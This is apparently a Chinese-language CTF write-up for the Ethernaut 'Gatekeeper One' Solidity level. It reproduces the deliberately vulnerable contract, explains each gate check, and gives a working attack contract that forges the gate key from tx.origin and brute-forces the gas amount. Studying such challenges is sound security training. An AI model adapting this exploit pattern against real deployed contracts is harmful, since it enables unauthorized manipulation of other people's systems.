# 13-GateKeeper One

日期: 20/08/2024
难易: 困难
漏洞小结: 绕过require
简单明了: 需要很清楚了解cast以及gas的使用方法

# 问题描述

Make it past the gatekeeper and register as an entrant to pass this level.

### **Things that might help:**

- Remember what you've learned from the Telephone and Token levels.
- You can learn more about the special function `gasleft()`, in Solidity's documentation (see [Units and Global Variables](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [External Function Calls](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

# 攻击思路

- 这里的gate其实就是要modifier我们需要pass `gateOne`，`gateTwo`还有`gateThree`
- `gateOne`的话，直接写一个攻击合约，然后由我们的EOA账号去调用攻击合约去攻击
    - `msg.sender`是攻击合约的地址
    - `tx.origin`是我们调用者的EOA账号地址
    - 这样`gateOne`就Pass了
- 要克服`gateTwo`的话，需要让`gasleft`这个函数return的数值是8191的倍数
    - total gas = (8191 * 3) + i
- 要克服`gateThree`的话，把三个require翻译一下
    - 第三个require - 左边一二bytes是tx.origin的右边一二bytes
    - 第二个require - 左边一二三四bytes不能为0
    - 第一个require - 右边一二bytes需要一样，右边三四bytes需要时0
    - 知道`tx.origin`之后就可以构造这么一个key

# 攻击方式

```solidity
contract Attack {
    function attack(address _target) external{
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for(uint256 i=0; i<300; i++){
            uint256 totalGas = i + (8191 * 3);
            (bool result, ) = _target.call{gas: totalGas}(abi.encodeWithSignature("enter(bytes8)",gateKey));
            if(result){
                break;
            }
        }
    }
}
```

# Ethernuat总结

Well done! Next, try your hand with the second gatekeeper…

# 小白的思考

关于变量的修饰符的确是好好的学习了一下

找到一个说明很好的文章

https://medium.com/@tanner.dev/ethernaut-x-foundry-level-13-gatekeeper-one-答案解說-0be3dde22ba6

然后对于gateTwo，直接使用爆破的方式还是非常值得学习的

以及如果使用low levelcal的话，都不需要建立目标